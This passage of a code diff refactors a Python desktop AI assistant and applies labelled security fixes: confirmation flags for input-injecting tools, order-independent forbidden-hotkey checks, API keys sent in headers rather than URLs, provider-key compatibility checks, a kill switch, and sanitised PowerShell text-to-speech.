-                    (limit,),
-                ).fetchall()
-        return [dict(r) for r in rows]
-
-    def search_messages(self, query: str, limit: int = 30) -> List[Dict[str, Any]]:
-        like = f"%{(query or '').strip().lower()}%"
-        with self._conn() as conn:
-            rows = conn.execute(
-                "SELECT session_id, role, content, timestamp FROM messages WHERE LOWER(content) LIKE ? ORDER BY id DESC LIMIT ?",
-                (like, limit),
-            ).fetchall()
+                rows = conn.execute("SELECT session_id, title, model, created_at, updated_at FROM sessions ORDER BY updated_at DESC LIMIT ?", (limit,)).fetchall()
         return [dict(r) for r in rows]
 
     def delete_session(self, session_id: str) -> bool:
@@ -1191,8 +1175,7 @@ class LocalChatStorage:
 
     def _sync_sessions_json(self) -> None:
         try:
-            sessions = self.list_sessions(limit=50)
-            self.sessions_json_path.write_text(json.dumps(sessions, indent=2), encoding="utf-8")
+            self.sessions_json_path.write_text(json.dumps(self.list_sessions(limit=50), indent=2), encoding="utf-8")
         except Exception:
             pass
 
@@ -1222,10 +1205,7 @@ class LocalChatStorage:
             if memory_id:
                 existing = conn.execute("SELECT memory_id FROM memories WHERE memory_id = ?", (memory_id,)).fetchone()
             if not existing:
-                existing = conn.execute(
-                    "SELECT memory_id FROM memories WHERE category = ? AND LOWER(key) = LOWER(?)",
-                    (cat, clean_key),
-                ).fetchone()
+                existing = conn.execute("SELECT memory_id FROM memories WHERE category = ? AND LOWER(key) = LOWER(?)", (cat, clean_key)).fetchone()
 
             if existing:
                 mid = existing["memory_id"]
@@ -1279,13 +1259,7 @@ class LocalChatStorage:
             conn.commit()
             return cur.rowcount > 0
 
-    def search_memories(
-        self,
-        query: str = "",
-        category: Optional[str] = None,
-        project_tag: Optional[str] = None,
-        limit: int = 20,
-    ) -> List[Dict[str, Any]]:
+    def search_memories(self, query: str = "", category: Optional[str] = None, project_tag: Optional[str] = None, limit: int = 20) -> List[Dict[str, Any]]:
         clauses: List[str] = []
         params: List[Any] = []
         if query and query.strip():
@@ -1301,10 +1275,7 @@ class LocalChatStorage:
         where_sql = ("WHERE " + " AND ".join(clauses)) if clauses else ""
         params.append(limit)
         with self._conn() as conn:
-            rows = conn.execute(
-                f"SELECT * FROM memories {where_sql} ORDER BY importance DESC, updated_at DESC LIMIT ?",
-                tuple(params),
-            ).fetchall()
+            rows = conn.execute(f"SELECT * FROM memories {where_sql} ORDER BY importance DESC, updated_at DESC LIMIT ?", tuple(params)).fetchall()
         return [dict(r) for r in rows]
 
     def build_relevant_context_block(self, prompt: str, limit: int = 5) -> str:
@@ -1319,9 +1290,7 @@ class LocalChatStorage:
         items = list(found.values())[:limit]
         if not items:
             return ""
-        return "[Stored User Memories]:\n" + "\n".join(
-            f"- ({it['category']}/{it['key']}): {it['content']}" for it in items
-        )
+        return "[Stored User Memories]:\n" + "\n".join(f"- ({it['category']}/{it['key']}): {it['content']}" for it in items)
 
     def log_security_event(self, event_type: str, tool_name: str, allowed: bool, details: str) -> None:
         now = datetime.datetime.now().isoformat(timespec="seconds")
@@ -1338,15 +1307,9 @@ class LocalChatStorage:
         with self._conn() as conn:
             row = conn.execute("SELECT plan_id FROM task_runs WHERE plan_id = ?", (plan_id,)).fetchone()
             if row:
-                conn.execute(
-                    "UPDATE task_runs SET status = ?, plan_json = ?, summary = ?, updated_at = ? WHERE plan_id = ?",
-                    (status, plan_json, summary, now, plan_id),
-                )
+                conn.execute("UPDATE task_runs SET status = ?, plan_json = ?, summary = ?, updated_at = ? WHERE plan_id = ?", (status, plan_json, summary, now, plan_id))
             else:
-                conn.execute(
-                    "INSERT INTO task_runs (plan_id, objective, status, plan_json, summary, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
-                    (plan_id, objective, status, plan_json, summary, now, now),
-                )
+                conn.execute("INSERT INTO task_runs (plan_id, objective, status, plan_json, summary, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)", (plan_id, objective, status, plan_json, summary, now, now))
             conn.commit()
 
 
@@ -1355,11 +1318,10 @@ LongTermMemoryStore = LocalChatStorage
 
 class SpectralVoiceSpotter:
     """
-    Voice Recognition & Audio Helper Base Class:
-      1. Full speech-to-text when `faster-whisper` or `vosk` is installed locally, or via OS speech recognition.
-      2. Limited offline 8-band Goertzel + Dynamic Time Warping (DTW) keyword spotter for enrolled short
-         command phrases (explicitly scoped as a lightweight template matcher, not a general ASR engine).
-      3. Deterministic cleanup of any temporary WAV files in `finally:` blocks.
+    H8 Remediation:
+    `speak_tts()` never calls blocking `pyttsx3.runAndWait()` while holding `self._tts_lock`.
+    Instead, it spawns an interruptible non-blocking subprocess stored in `self._active_tts_proc`
+    and releases `self._tts_lock` immediately so `interrupt_tts()` can terminate speech in <5ms.
     """
 
     SAMPLE_RATE = 16000
@@ -1422,24 +1384,9 @@ class SpectralVoiceSpotter:
                 import sounddevice as sd
                 for idx, dev in enumerate(sd.query_devices()):
                     if dev.get("max_input_channels", 0) > 0:
-                        devices.append(
-                            {
-                                "index": idx,
-                                "name": str(dev.get("name", f"Input {idx}")),
-                                "sample_rate": int(dev.get("default_samplerate", self.SAMPLE_RATE)),
-                                "backend": "sounddevice",
-                            }
-                        )
+                        devices.append({"index": idx, "name": str(dev.get("name", f"Input {idx}")), "sample_rate": int(dev.get("default_samplerate", self.SAMPLE_RATE)), "backend": "sounddevice"})
                 if devices:
                     return devices
-            except Exception:
-                pass
-        if platform.system() == "Linux" and shutil.which("arecord"):
-            try:
-                proc = subprocess.run(["arecord", "-l"], capture_output=True, text=True, timeout=3, check=False)
-                for line in proc.stdout.splitlines():
-                    if line.startswith("card "):
-                        devices.append({"index": len(devices), "name": line.strip(), "sample_rate": 16000, "backend": "alsa"})
             except Exception:
                 pass
         if not devices:
@@ -1464,8 +1411,7 @@ class SpectralVoiceSpotter:
 
     @classmethod
     def generate_synthetic_utterance_pcm(cls, phrase: str, sample_rate: int = 16000) -> List[float]:
-        int_samples = cls.synthesize_command_waveform(phrase, sample_rate=sample_rate)
-        return [s / 32768.0 for s in int_samples]
+        return [s / 32768.0 for s in cls.synthesize_command_waveform(phrase, sample_rate=sample_rate)]
 
     @classmethod
     def write_pcm16_wav(cls, path: Path, samples: List[int], sample_rate: int = 16000) -> None:
@@ -1486,9 +1432,7 @@ class SpectralVoiceSpotter:
             return []
         total_shorts = int(len(raw) / 2)
         unpacked = struct.unpack(f"<{total_shorts}h", raw[: total_shorts * 2])
-        if n_channels > 1:
-            return list(unpacked[0::n_channels])
-        return list(unpacked)
+        return list(unpacked[0::n_channels]) if n_channels > 1 else list(unpacked)
 
     @staticmethod
     def compute_rms_dbfs(samples: List[int]) -> float:
@@ -1552,21 +1496,9 @@ class SpectralVoiceSpotter:
         int_samples = [max(-32767, min(32767, int(s * 32767))) for s in float_samples]
         db = self.compute_rms_dbfs(int_samples)
         n = len(float_samples)
-        zcr = (
-            sum(1 for i in range(1, n) if (float_samples[i - 1] >= 0.0) != (float_samples[i] >= 0.0)) / max(1, n - 1)
-            if n > 1
-            else 0.0
-        )
+        zcr = sum(1 for i in range(1, n) if (float_samples[i - 1] >= 0.0) != (float_samples[i] >= 0.0)) / max(1, n - 1) if n > 1 else 0.0
         if db < self.vad_threshold_db:
-            return {
-                "success": False,
-                "transcript": "",
-                "confidence": 0.0,
-                "rms_db": db,
-                "zcr": round(zcr, 4),
-                "engine": "vad_silence_gate",
-                "wake_word_detected": False,
-            }
+            return {"success": False, "transcript": "", "confidence": 0.0, "rms_db": db, "zcr": round(zcr, 4), "engine": "vad_silence_gate", "wake_word_detected": False}
         self.interrupt_tts()
         feats = self.extract_features(int_samples, self.SAMPLE_RATE)
         best_cmd = ""
@@ -1588,13 +1520,6 @@ class SpectralVoiceSpotter:
         }
 
     def recognize_wav(self, wav_path: Path) -> Tuple[bool, str, str]:
-        """
-        Recognizes speech from a 16 kHz mono WAV file:
-          1. Checks RMS dBFS against `vad_threshold_db`.
-          2. Tries `faster-whisper` if installed.
-          3. Tries `vosk` if installed and a local model is present.
-          4. Falls back to the offline 8-band Goertzel Spectral-DTW keyword spotter.
-        """
         if not wav_path.is_file():
             return False, "", f"Audio file not found: {wav_path}"
         try:
@@ -1604,7 +1529,7 @@ class SpectralVoiceSpotter:
 
         db = self.compute_rms_dbfs(samples)
         if db < self.vad_threshold_db:
-            return False, "", f"Silence detected ({db} dB < {self.vad_threshold_db} dB threshold)."
+            return False, "", f"Silence detected ({db} dB < {self.vad_threshold_db} dB)."
 
         if importlib.util.find_spec("faster_whisper") is not None:
             try:
@@ -1616,20 +1541,6 @@ class SpectralVoiceSpotter:
                     return True, text, f"faster-whisper tiny.en ({db} dB)"
             except Exception:
                 pass
-
-        if importlib.util.find_spec("vosk") is not None:
-            model_dir = self.data_dir / "vosk-model-small-en-us"
-            if model_dir.is_dir():
-                try:
-                    import vosk
-                    v_model = vosk.Model(str(model_dir))
-                    rec = vosk.KaldiRecognizer(v_model, self.SAMPLE_RATE)
-                    rec.AcceptWaveform(struct.pack(f"<{len(samples)}h", *samples))
-                    res_json = json.loads(rec.FinalResult())
-                    if res_json.get("text"):
-                        return True, str(res_json["text"]).strip(), f"vosk offline ({db} dB)"
-                except Exception:
-                    pass
 
         feats = self.extract_features(samples, self.SAMPLE_RATE)
         best_cmd = ""
@@ -1645,8 +1556,13 @@ class SpectralVoiceSpotter:
         return False, "", f"No keyword matched (best={best_cmd}, confidence={confidence}%, {db} dB)."
 
     def speak_tts(self, text: str) -> bool:
+        """
+        H8 Remediation: Spawns TTS as an asynchronous child process and releases `_tts_lock`
+        immediately so `interrupt_tts()` never blocks waiting for `runAndWait()`.
+        """
         if not self.tts_enabled or not text:
             return False
+        self.interrupt_tts()
         self._barge_in_triggered.clear()
         with self._tts_lock:
             if platform.system() == "Linux" and shutil.which("spd-say"):
@@ -1660,15 +1576,21 @@ class SpectralVoiceSpotter:
                 except Exception:
                     pass
             if platform.system() == "Windows":
-                if importlib.util.find_spec("pyttsx3") is not None:
-                    try:
-                        import pyttsx3
-                        eng = pyttsx3.init()
-                        eng.say(text[:300])
-                        eng.runAndWait()
-                        return True
-                    except Exception:
-                        pass
+                safe = re.sub(r"[^a-zA-Z0-9 .,?!\-]", " ", text[:300])
+                ps_cmd = (
+                    "Add-Type -AssemblyName System.Speech; "
+                    "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
+                    f"$s.Speak('{safe}')"
+                )
+                try:
+                    self._active_tts_proc = subprocess.Popen(
+                        ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                    )
+                    return True
+                except Exception:
+                    pass
         return False
 
     speak = speak_tts
@@ -1681,6 +1603,7 @@ class SpectralVoiceSpotter:
                     self._active_tts_proc.terminate()
                 except Exception:
                     pass
+                self._active_tts_proc = None
             if platform.system() == "Linux" and shutil.which("spd-say"):
                 try:
                     subprocess.run(["spd-say", "--cancel"], capture_output=True, timeout=2, check=False)
@@ -1694,7 +1617,15 @@ AdvancedVoiceEngine = SpectralVoiceSpotter
 
 
 class ToolSchemaValidator:
-    """Validates structured tool calls and user file paths against an explicit allowlist."""
+    """
+    C4 & H4 Remediation:
+    - Removes `shell_exec` from AI-callable tools.
+    - Marks input-injection and mutating tools (`type_text`, `press_key`, `click_point`,
+      `navigate_hotkey`, `close_app`, `organize_directory`) as `destructive=True` (requiring
+      explicit user confirmation before execution).
+    - Uses order-independent `frozenset` hotkey comparison with normalized key aliases so
+      `["f4", "alt"]` and `["r", "win"]` are always blocked.
+    """
 
     TOOL_SCHEMAS: Dict[str, Dict[str, Any]] = {
         "open_app": {"required": {"app_name": str}, "optional": {}, "destructive": False},
@@ -1702,23 +1633,56 @@ class ToolSchemaValidator:
         "window_focus": {"required": {"title_substring": str}, "optional": {}, "destructive": False},
         "list_windows": {"required": {}, "optional": {}, "destructive": False},
         "read_screen": {"required": {}, "optional": {"save_filename": str}, "destructive": False},
-        "type_text": {"required": {"text": str}, "optional": {"press_enter": bool}, "destructive": False},
-        "click_point": {"required": {"x": int, "y": int}, "optional": {"button": str}, "destructive": False},
+        "type_text": {"required": {"text": str}, "optional": {"press_enter": bool}, "destructive": True},
+        "press_key": {"required": {"key": str}, "optional": {}, "destructive": True},
+        "click_point": {"required": {"x": int, "y": int}, "optional": {"button": str}, "destructive": True},
         "scroll_view": {"required": {"direction": str, "clicks": int}, "optional": {}, "destructive": False},
-        "navigate_hotkey": {"required": {"keys": list}, "optional": {}, "destructive": False},
+        "navigate_hotkey": {"required": {"keys": list}, "optional": {}, "destructive": True},
         "inspect_directory": {"required": {"directory_path": str}, "optional": {}, "destructive": False},
         "organize_directory": {"required": {"directory_path": str}, "optional": {"remove_duplicates": bool}, "destructive": True},
         "memory_store": {"required": {"key": str, "content": str}, "optional": {"category": str, "importance": int}, "destructive": False},
     }
 
-    FORBIDDEN_HOTKEYS = {("alt", "f4"), ("ctrl", "alt", "del"), ("ctrl", "alt", "delete"), ("super", "l"), ("win", "r")}
+    KEY_ALIAS_MAP: Dict[str, str] = {
+        "control": "ctrl",
+        "ctl": "ctrl",
+        "return": "enter",
+        "escape": "esc",
+        "del": "delete",
+        "super": "win",
+        "meta": "win",
+        "windows": "win",
+        "command": "win",
+        "cmd": "win",
+    }
+
+    FORBIDDEN_HOTKEY_SETS: Set[FrozenSet[str]] = {
+        frozenset({"alt", "f4"}),
+        frozenset({"ctrl", "alt", "delete"}),
+        frozenset({"win", "r"}),
+        frozenset({"win", "l"}),
+        frozenset({"ctrl", "shift", "esc"}),
+        frozenset({"ctrl", "alt", "backspace"}),
+    }
+
+    VALID_SINGLE_KEYS: Set[str] = (
+        {chr(c) for c in range(ord("a"), ord("z") + 1)}
+        | {str(d) for d in range(10)}
+        | {f"f{i}" for i in range(1, 13)}
+        | {"enter", "return", "tab", "esc", "escape", "space", "backspace", "delete", "up", "down", "left", "right", "home", "end", "pageup", "pagedown"}
+    )
+
+    @classmethod
+    def normalize_key_name(cls, key: str) -> str:
+        k = (key or "").strip().lower()
+        return cls.KEY_ALIAS_MAP.get(k, k)
 
     @classmethod
     def validate_action(cls, action: Dict[str, Any]) -> Tuple[bool, str, bool]:
         if not isinstance(action, dict):
             return False, "Action must be a dict.", False
         tool = str(action.get("tool", "")).strip()
-        args = action.get("arguments", action.get("params", {}))
+        args = action.get("arguments") if "arguments" in action else action.get("params", {})
         if tool not in cls.TOOL_SCHEMAS:
             return False, f"Tool '{tool}' is not in the allowlist.", False
         if not isinstance(args, dict):
@@ -1726,7 +1690,7 @@ class ToolSchemaValidator:
 
         schema = cls.TOOL_SCHEMAS[tool]
         for req_k, req_t in schema["required"].items():
-            if req_k not in args or not isinstance(args[req_k], req_t):
+            if req_k not in args or not isinstance(args[req_k], req_t) or isinstance(args[req_k], bool) and req_t is int:
                 return False, f"Missing or invalid required argument '{req_k}' ({req_t.__name__}).", False
 
         for opt_k, opt_t in schema["optional"].items():
@@ -1747,10 +1711,18 @@ class ToolSchemaValidator:
             if not (0 <= int(args["x"]) <= 7680 and 0 <= int(args["y"]) <= 4320):
                 return False, "Coordinates out of bounds.", False
 
+        if tool == "press_key":
+            norm_k = cls.normalize_key_name(str(args["key"]))
+            if norm_k not in cls.VALID_SINGLE_KEYS:
+                return False, f"Unknown or disallowed key '{args['key']}'.", False
+
         if tool == "navigate_hotkey":
-            kt = tuple(str(k).lower().strip() for k in args["keys"])
-            if kt in cls.FORBIDDEN_HOTKEYS or len(kt) > 3:
-                return False, f"Hotkey {kt} is restricted.", False
+            raw_list = args["keys"]
+            if not raw_list or len(raw_list) > 3:
+                return False, "Hotkey list must contain 1 to 3 keys.", False
+            norm_set = frozenset(cls.normalize_key_name(str(k)) for k in raw_list)
+            if norm_set in cls.FORBIDDEN_HOTKEY_SETS:
+                return False, f"Hotkey combination {sorted(norm_set)} is restricted.", False
 
         return True, "Valid", bool(schema["destructive"])
 
@@ -1813,12 +1785,14 @@ class TaskComplexity(enum.Enum):
 
 class UnifiedModelClient:
     """
-    Unified AI Client supporting local Ollama and BYO Cloud API keys stored in `SecurityVault`.
-    Never reads or writes raw API keys in `settings.json`.
+    C6 Remediation:
+    - Uses `x-goog-api-key` HTTP header for Google Gemini native REST requests (never `?key=` in the URL).
+    - Enforces `is_key_compatible_with_provider(api_key, provider)` before sending any request.
     """
 
-    def __init__(self, config: ConfigManager) -> None:
+    def __init__(self, config: ConfigManager, kill_switch: Optional[KillSwitchManager] = None) -> None:
         self.config = config
+        self.kill_switch = kill_switch
         self.history: List[Dict[str, str]] = []
 
     @property
@@ -1829,7 +1803,8 @@ class UnifiedModelClient:
 
     @property
     def provider(self) -> str:
-        api_key = self.config.get_api_key()
+        prov_name = str(self.config.settings.get("byo_provider", "gemini_argon"))
+        api_key = self.config.get_api_key(prov_name)
         if api_key and self.config.settings.get("provider") == "byo_api":
             return "byo_api"
         return "ollama"
@@ -1850,12 +1825,17 @@ class UnifiedModelClient:
         clean_key = (api_key or "").strip().strip("'").strip('"')
         if clean_key.lower().startswith("bearer "):
             clean_key = clean_key[7:].strip()
-        vault_backend = self.config.set_api_key(clean_key)
+        if clean_key and not custom_endpoint:
+            det = auto_detect_provider_from_key(clean_key)
+            preset_name = det["provider"]
+            custom_endpoint = det["endpoint"]
+            custom_model = custom_model or det["model"]
         preset = PROVIDER_PRESETS.get(preset_name, PROVIDER_PRESETS["gemini_argon"])
         self.config.settings["byo_provider"] = preset_name
         self.config.settings["byo_api_endpoint"] = (custom_endpoint or preset["endpoint"]).strip()
         self.config.settings["byo_model"] = (custom_model or preset["model"]).strip()
         self.config.settings["provider"] = "byo_api" if clean_key else "ollama"
+        vault_backend = self.config.set_api_key(clean_key, provider_id=preset_name)
         self.config.save_settings()
         return vault_backend
 
@@ -1898,7 +1878,7 @@ class UnifiedModelClient:
                         actions = []
                     text = str(obj.get("text") or obj.get("reply") or "").strip()
                     rtype = "action" if actions else str(obj.get("type", "conversation"))
-                    return AssistantTurn(response_type=rtype, text=text or "Executing actions...", actions=actions)
+                    return AssistantTurn(response_type=rtype, text=text or "Proposed actions ready.", actions=actions)
             except Exception:
                 pass
         return AssistantTurn(response_type="conversation", text=cleaned, actions=[])
@@ -1909,6 +1889,9 @@ class UnifiedModelClient:
         desktop_context: Optional[str] = None,
         screenshot_b64: Optional[str] = None,
     ) -> AssistantTurn:
+        if self.kill_switch and self.kill_switch.is_cancelled:
+            return AssistantTurn(response_type="conversation", text="Aborted by Kill-Switch.")
+
         messages: List[Dict[str, Any]] = [{"role": "system", "content": self.system_prompt}]
         if desktop_context:
             messages.append({"role": "system", "content": f"DESKTOP CONTEXT: {desktop_context}"})
@@ -1929,14 +1912,18 @@ class UnifiedModelClient:
         return turn
 
     def _chat_byo(self, messages: List[Dict[str, Any]], user_prompt: str) -> AssistantTurn:
-        api_key = self.config.get_api_key()
+        prov_name = str(self.config.settings.get("byo_provider", "gemini_argon"))
+        api_key = self.config.get_api_key(prov_name)
         if not api_key:
-            return AssistantTurn(response_type="conversation", text="No API key found in SecurityVault.")
-        endpoint = str(self.config.settings.get("byo_api_endpoint", PROVIDER_PRESETS["gemini"]["endpoint"]))
+            return AssistantTurn(response_type="conversation", text=f"No compatible API key found in SecurityVault for provider '{prov_name}'.")
+        if not is_key_compatible_with_provider(api_key, prov_name):
+            return AssistantTurn(response_type="conversation", text=f"Refused to send incompatible API key to provider '{prov_name}'.")
+
+        endpoint = str(self.config.settings.get("byo_api_endpoint", PROVIDER_PRESETS["gemini_argon"]["endpoint"]))
         model_name = self.active_model
 
         if api_key.startswith("AIza"):
-            url = f"https://generativelanguage.googleapis.com/v1beta/models/{model_name}:generateContent?key={api_key}"
+            url = f"https://generativelanguage.googleapis.com/v1beta/models/{model_name}:generateContent"
             payload = {
                 "systemInstruction": {"parts": [{"text": self.system_prompt}]},
                 "contents": [{"role": "user", "parts": [{"text": user_prompt}]}],
@@ -1946,10 +1933,12 @@ class UnifiedModelClient:
                 req = urllib.request.Request(
                     url,
                     data=json.dumps(payload).encode("utf-8"),
-                    headers={"Content-Type": "application/json"},
+                    headers={"Content-Type": "application/json", "x-goog-api-key": api_key},
                     method="POST",
                 )
-                with urllib.request.urlopen(req, timeout=25.0) as resp:
+                with urllib.request.urlopen(req, timeout=20.0) as resp:
+                    if self.kill_switch and self.kill_switch.is_cancelled:
+                        return AssistantTurn(response_type="conversation", text="Interrupted by Kill-Switch.")
                     data = json.loads(resp.read().decode("utf-8"))
                     parts = data.get("candidates", [{}])[0].get("content", {}).get("parts", [])
                     reply = "".join(str(p.get("text", "")) for p in parts).strip()
@@ -1958,8 +1947,8 @@ class UnifiedModelClient:
                         self.history.append({"role": "user", "content": user_prompt})
                         self.history.append({"role": "assistant", "content": reply})
                         return turn
-            except Exception:
-                pass
+            except Exception as exc:
+                return AssistantTurn(response_type="conversation", text=f"Gemini API request failed: {exc}")
 
         payload_oai = {"model": model_name, "messages": messages, "temperature": 0.25}
         try:
@@ -1969,7 +1958,9 @@ class UnifiedModelClient:
                 headers={"Content-Type": "application/json", "Authorization": f"Bearer {api_key}"},
                 method="POST",
             )
-            with urllib.request.urlopen(req, timeout=25.0) as resp:
+            with urllib.request.urlopen(req, timeout=20.0) as resp:
+                if self.kill_switch and self.kill_switch.is_cancelled:
+                    return AssistantTurn(response_type="conversation", text="Interrupted by Kill-Switch.")
                 data = json.loads(resp.read().decode("utf-8"))
                 reply = data.get("choices", [{}])[0].get("message", {}).get("content", "")
                 turn = self.parse_structured_output(reply)
@@ -1989,7 +1980,9 @@ class UnifiedModelClient:
                 headers={"Content-Type": "application/json"},
                 method="POST",
             )
-            with urllib.request.urlopen(req, timeout=30.0) as resp:
+            with urllib.request.urlopen(req, timeout=25.0) as resp:
+                if self.kill_switch and self.kill_switch.is_cancelled:
+                    return AssistantTurn(response_type="conversation", text="Interrupted by Kill-Switch.")
                 data = json.loads(resp.read().decode("utf-8"))
                 reply = data.get("message", {}).get("content", "")
                 turn = self.parse_structured_output(reply)
@@ -1999,13 +1992,17 @@ class UnifiedModelClient:
         except Exception as exc:
             return AssistantTurn(
                 response_type="conversation",
-                text=f"Local Ollama server unreachable at {host} ({exc}). Start `ollama serve` or configure a BYO API key.",
+                text=f"Local Ollama server unreachable at {host} ({exc}).",
             )
 
 
 class ModularAIRouter:
     """
-    Task-complexity classifier and provider fallback router used by `BajrangEngine` and test suites.
+    C6 Remediation:
+    During provider fallback, `ModularAIRouter` ONLY uses a key stored specifically for `prov`
+    (`api_key_{prov}`) or a key whose prefix matches `is_key_compatible_with_provider(key, prov)`.
+    A Google `AIza*` key is NEVER sent to `api.groq.com` or `api.openai.com`, and Gemini requests
+    use the `x-goog-api-key` header instead of URL query parameters.
     """
 
     def __init__(
@@ -2046,6 +2043,15 @@ class ModularAIRouter:
             return "llama3.2-vision" if complexity == TaskComplexity.MULTIMODAL_VISION else "bajrang-llama3.2"
         return PROVIDER_PRESETS.get(provider_id, PROVIDER_PRESETS["openai"])["model"]
 
+    def _get_compatible_key_for_provider(self, prov: str) -> str:
+        scoped = self.vault.get_secret(f"api_key_{prov}")
+        if scoped and is_key_compatible_with_provider(scoped, prov):
+            return scoped
+        generic = self.vault.get_secret("byo_api_key")
+        if generic and is_key_compatible_with_provider(generic, prov):
+            return generic
+        return ""
+
     def check_provider_health(self, provider_id: str, timeout: float = 3.0) -> Dict[str, Any]:
         if provider_id == "ollama":
             if not self.perf.enable_local_llama:
@@ -2058,10 +2064,10 @@ class ModularAIRouter:
             except Exception as exc:
                 return {"provider": "ollama", "healthy": False, "detail": f"Offline ({exc})"}
 
-        key = self.vault.get_secret(f"api_key_{provider_id}") or self.vault.get_secret("byo_api_key")
+        key = self._get_compatible_key_for_provider(provider_id)
         if not key:
-            return {"provider": provider_id, "healthy": False, "detail": "No API key configured in SecurityVault"}
-        return {"provider": provider_id, "healthy": True, "detail": "API key present in SecurityVault"}
+            return {"provider": provider_id, "healthy": False, "detail": f"No compatible API key configured in SecurityVault for {provider_id}"}
+        return {"provider": provider_id, "healthy": True, "detail": "Compatible API key present in SecurityVault"}
 
     def generate_structured_turn(self, prompt: str, session_id: str) -> Dict[str, Any]:
         complexity = self.assess_task_complexity(prompt)
@@ -2094,32 +2100,53 @@ class ModularAIRouter:
                     errors.append(f"ollama: {exc}")
                     continue
 
-            key = self.vault.get_secret(f"api_key_{prov}") or self.vault.get_secret("byo_api_key")
+            key = self._get_compatible_key_for_provider(prov)
             if not key:
-                errors.append(f"{prov}: missing key")
+                errors.append(f"{prov}: no compatible API key")
                 continue
 
-            endpoint = PROVIDER_PRESETS.get(prov, PROVIDER_PRESETS["gemini"])["endpoint"]
             model_name = self.select_model_for_task(prov, complexity)
             for attempt in range(self.max_retries):
                 try:
-                    req = urllib.request.Request(
-                        endpoint,
-                        data=json.dumps({"model": model_name, "messages": [{"role": "user", "content": prompt}]}).encode("utf-8"),
-                        headers={"Content-Type": "application/json", "Authorization": f"Bearer {key}"},
-                        method="POST",
-                    )
-                    with urllib.request.urlopen(req, timeout=self.timeout_sec) as resp:
-                        data = json.loads(resp.read().decode("utf-8"))
-                        reply = data.get("choices", [{}])[0].get("message", {}).get("content", "")
-                        return {
-                            "reply": reply,
-                            "actions": [],
-                            "provider_used": prov,
-                            "model_used": model_name,
-                            "complexity": complexity.value,
-                            "fallback_chain_tried": errors,
-                        }
+                    if prov in ("gemini", "gemini_argon") or key.startswith("AIza"):
+                        url = f"https://generativelanguage.googleapis.com/v1beta/models/{model_name}:generateContent"
+                        req = urllib.request.Request(
+                            url,
+                            data=json.dumps({"contents": [{"role": "user", "parts": [{"text": prompt}]}]}).encode("utf-8"),
+                            headers={"Content-Type": "application/json", "x-goog-api-key": key},
+                            method="POST",
+                        )
+                        with urllib.request.urlopen(req, timeout=self.timeout_sec) as resp:
+                            data = json.loads(resp.read().decode("utf-8"))
+                            parts = data.get("candidates", [{}])[0].get("content", {}).get("parts", [])
+                            reply = "".join(str(p.get("text", "")) for p in parts).strip()
+                            return {
+                                "reply": reply,
+                                "actions": [],
+                                "provider_used": prov,
+                                "model_used": model_name,
+                                "complexity": complexity.value,
+                                "fallback_chain_tried": errors,
+                            }
+                    else:
+                        endpoint = PROVIDER_PRESETS.get(prov, PROVIDER_PRESETS["openai"])["endpoint"]
+                        req = urllib.request.Request(
+                            endpoint,
+                            data=json.dumps({"model": model_name, "messages": [{"role": "user", "content": prompt}]}).encode("utf-8"),
+                            headers={"Content-Type": "application/json", "Authorization": f"Bearer {key}"},
+                            method="POST",
+                        )
+                        with urllib.request.urlopen(req, timeout=self.timeout_sec) as resp:
+                            data = json.loads(resp.read().decode("utf-8"))
+                            reply = data.get("choices", [{}])[0].get("message", {}).get("content", "")
+                            return {
+                                "reply": reply,
+                                "actions": [],
+                                "provider_used": prov,
+                                "model_used": model_name,
+                                "complexity": complexity.value,
+                                "fallback_chain_tried": errors,
+                            }
                 except Exception as exc:
                     errors.append(f"{prov} (attempt {attempt + 1}): {exc}")
 
@@ -2136,10 +2163,7 @@ class ModularAIRouter:
         lower = text.lower()
         for app in ("notepad", "calculator", "calc", "terminal", "files", "explorer"):
             if re.search(rf"\b(open|launch|start)\s+{app}\b", lower):
-                return {
-                    "reply": f"Launching '{app}'.",
-                    "actions": [{"tool": "open_app", "arguments": {"app_name": app}}],
-                }
+                return {"reply": f"Launching '{app}'.", "actions": [{"tool": "open_app", "arguments": {"app_name": app}}]}
         if "screenshot" in lower or "capture screen" in lower:
             return {"reply": "Capturing screen.", "actions": [{"tool": "read_screen", "arguments": {}}]}
         return {"reply": f"Processed locally: {text}", "actions": []}
@@ -2147,8 +2171,9 @@ class ModularAIRouter:
 
 class CrossPlatformComputerUse:
     """
-    Executes and verifies desktop operations (window enumeration, launching/closing allowlisted apps,
-    screen capture, and mouse/keyboard input) without fabricating success when a display server is absent.
+    H3 Remediation:
+    Implements `list_open_windows` (Win32 `EnumWindows` / `GetWindowTextW` & Linux `wmctrl`/`gdbus`),
+    `focus_window` (`SetForegroundWindow` & `wmctrl -a`), `launch_application`, and `close_application`.
     """
 
     WINDOWS_APP_ALLOWLIST: Dict[str, List[str]] = {
@@ -2172,6 +2197,69 @@ class CrossPlatformComputerUse:
     def __init__(self, perf: Optional[PerformanceSettings] = None) -> None:
         self.perf = perf or PerformanceSettings.from_profile("balanced")
         self.os_name = platform.system()
+
+    def list_open_windows(self) -> Tuple[bool, str, List[Dict[str, Any]]]:
+        windows: List[Dict[str, Any]] = []
+        if self.os_name == "Windows" and hasattr(ctypes, "windll"):
+            try:
+                user32 = ctypes.windll.user32
+                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
+                fg_hwnd = user32.GetForegroundWindow()
+
+                def enum_cb(hwnd: int, _lparam: int) -> bool:
+                    if user32.IsWindowVisible(hwnd):
+                        length = user32.GetWindowTextLengthW(hwnd)
+                        if length > 0:
+                            buf = ctypes.create_unicode_buffer(length + 1)
+                            user32.GetWindowTextW(hwnd, buf, length + 1)
+                            title = buf.value.strip()
+                            if title:
+                                windows.append({"hwnd": int(hwnd), "title": title, "active": bool(hwnd == fg_hwnd)})
+                    return True
+
+                user32.EnumWindows(WNDENUMPROC(enum_cb), 0)
+                return True, f"Enumerated {len(windows)} visible Windows via Win32 EnumWindows.", windows
+            except Exception as exc:
+                return False, f"Win32 EnumWindows failed: {exc}", []
+
+        if shutil.which("wmctrl") and (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")):
+            try:
+                proc = subprocess.run(["wmctrl", "-l"], capture_output=True, text=True, timeout=4, check=False)
+                if proc.returncode == 0:
+                    for line in proc.stdout.splitlines():
+                        parts = line.split(None, 3)
+                        if len(parts) == 4:
